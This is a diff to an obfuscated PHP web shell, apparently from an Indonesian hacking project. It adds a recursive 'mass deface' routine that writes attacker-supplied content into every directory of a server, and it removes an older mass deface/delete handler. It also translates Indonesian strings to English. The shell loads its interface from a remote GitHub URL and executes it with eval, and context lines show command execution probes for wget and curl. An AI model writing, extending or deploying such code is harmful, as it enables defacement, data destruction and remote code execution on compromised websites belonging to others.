@@ -174,6 +174,36 @@ function _wp_db_error($_e3f4bc28) { if ($_e3f4bc28['type'] === 'mysqli') return 
 function _wp_db_close($_e3f4bc28) { if ($_e3f4bc28['type'] === 'mysqli') $_e3f4bc28['conn']->close(); else @mysql_close($_e3f4bc28['conn']); }
 function _wp_db_escape($_e3f4bc28, $_1b0ecf0b) { if ($_e3f4bc28['type'] === 'mysqli') return $_e3f4bc28['conn']->real_escape_string($_1b0ecf0b); else return @mysql_real_escape_string($_1b0ecf0b, $_e3f4bc28['conn']); }
 
+// ==================================================================================
+// FUNGSI MASS DEFACER BARU (REKURSIF)
+// ==================================================================================
+function _mass_deface_recursive($directory, $filename_to_create, $file_content, &$output_log) {
+    // Pertama, buat file di direktori saat ini
+    $target_file = rtrim($directory, '/') . '/' . $filename_to_create;
+    if (@file_put_contents($target_file, $file_content)) {
+        $output_log .= "CREATED: " . htmlspecialchars($target_file) . "\n";
+    } else {
+        $output_log .= "FAILED: " . htmlspecialchars($target_file) . " (not writable)\n";
+    }
+
+    // Kemudian, masuk ke subdirektori
+    $items = @scandir($directory);
+    if (!$items) {
+        $output_log .= "Failed to scan directory for recursion: " . htmlspecialchars($directory) . "\n";
+        return;
+    }
+
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        $path = rtrim($directory, '/') . '/' . $item;
+        if (is_dir($path)) {
+            // Panggil fungsi ini lagi untuk subdirektori
+            _mass_deface_recursive($path, $filename_to_create, $file_content, $output_log);
+        }
+    }
+}
+
+
 $_ca37af64 = _d3513697();
 $_de8d0d27 = !$_ca37af64 || !@file_exists($_ca37af64);
 
@@ -411,40 +441,17 @@ if (isset($_a45380c7['ajax'])) {
             }
             $_3e7b0bfb = array('status' => 'ok', 'output' => htmlspecialchars($_b9ea6d99));
             break;
-            
+
+        // ==================================================================================
+        // BLOK MASS DEFACER BARU
+        // ==================================================================================
         case 'mass_deface':
-        case 'mass_delete':
-            $_948c27a2 = $_POST['d_dir'];
-            $_31a81232 = $_POST['d_file'];
-            $_e6b8c4d2 = ($_a45380c7['action'] == 'mass_deface') ? $_POST['script'] : null;
-            $_948c27a2 = rtrim($_948c27a2, '/') . '/';
-            $_f0f9344 = '';
-            
-            function _e90089a8($_40550b4c, $_31a81232, $_e6b8c4d2, $_96020524, &$_f0f9344) {
-                $_e11ee94d = @scandir($_40550b4c);
-                if (!$_e11ee94d) { $_f0f9344 .= "Cannot scan: " . htmlspecialchars($_40550b4c) . "\n"; return; }
-                foreach ($_e11ee94d as $_1f1b251e) {
-                    if ($_1f1b251e == '.' || $_1f1b251e == '..') continue;
-                    $_c364cff4 = rtrim($_40550b4c, '/') . '/' . $_1f1b251e;
-                    if (is_dir($_c364cff4) && $_96020524 == 'mass') {
-                        _e90089a8($_c364cff4, $_31a81232, $_e6b8c4d2, $_96020524, $_f0f9344);
-                    }
-                    if (basename($_c364cff4) == $_31a81232) {
-                        if ($_e6b8c4d2 !== null) { // Deface
-                            if (@file_put_contents($_c364cff4, $_e6b8c4d2)) $_f0f9344 .= "Defaced: " . htmlspecialchars($_c364cff4) . "\n";
-                        } else { // Delete
-                            if(is_dir($_c364cff4)) {
-                                if (@rmdir($_c364cff4)) $_f0f9344 .= "Deleted Dir: " . htmlspecialchars($_c364cff4) . "\n";
-                            } else {
-                                if (@unlink($_c364cff4)) $_f0f9344 .= "Deleted File: " . htmlspecialchars($_c364cff4) . "\n";
-                            }
-                        }
-                    }
-                }
-            }
-            
-            _e90089a8($_948c27a2, $_31a81232, $_e6b8c4d2, $_POST['tipe'], $_f0f9344);
-            $_3e7b0bfb = array('status' => 'ok', 'output' => $_f0f9344 ?: 'No files found or action failed.');
+            $directory = $_POST['d_dir'];
+            $filename_to_create = isset($_POST['new_filename']) ? $_POST['new_filename'] : 'index.php';
+            $script_content = isset($_POST['script']) ? $_POST['script'] : '';
+            $output_log = "--- Mass Deface (Create File) Log ---\n";
+            _mass_deface_recursive($directory, $filename_to_create, $script_content, $output_log);
+            $_3e7b0bfb = array('status' => 'ok', 'output' => $output_log);
             break;
 
         case 'backdoor_destroyer':
@@ -732,7 +739,7 @@ if (isset($_a45380c7['action']) && $_a45380c7['action'] == 'download' && isset($
     exit;
 }
 
-// Persiapan variabel dinamis untuk UI
+// Prepare dynamic variables for UI
 $_1e31f9a2 = (function_exists('mysql_connect') || class_exists('mysqli')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
 $_7a4488a6 = (function_exists('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
 $_27d89127 = (_beefd37d('which wget')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
@@ -758,7 +765,7 @@ if ($_a13b6a78) {
 }
 
 // ==================================================================================
-// BAGIAN PEMUAT UI JARAK JAUH (REMOTE UI LOADER)
+// REMOTE UI LOADER SECTION
 // ==================================================================================
 $remote_ui_url = "https://raw.githubusercontent.com/z3r0-team/IndonesianPeople5h3llz-Project/refs/heads/main/html-css-js.txt";
 $ui_content = false;
@@ -786,6 +793,6 @@ if ($ui_content !== false && !empty($ui_content)) {
     eval('?>' . $ui_content);
 } else {
     header("Content-Type: text/html; charset=utf-8");
-    die("<!DOCTYPE html><html><head><title>Error</title><body style='font-family:sans-serif;background:#111;color:#eee;'><h1>Gagal Memuat UI Jarak Jauh</h1><p>Tidak dapat mengambil antarmuka pengguna dari server jarak jauh.</p><p><strong>URL:</strong> " . htmlspecialchars($remote_ui_url) . "</p></body></html>");
+    die("<!DOCTYPE html><html><head><title>Error</title><body style='font-family:sans-serif;background:#111;color:#eee;'><h1>Failed to Load Remote UI</h1><p>Could not retrieve the user interface from the remote server.</p><p><strong>URL:</strong> " . htmlspecialchars($remote_ui_url) . "</p></body></html>");
 }
 ?>
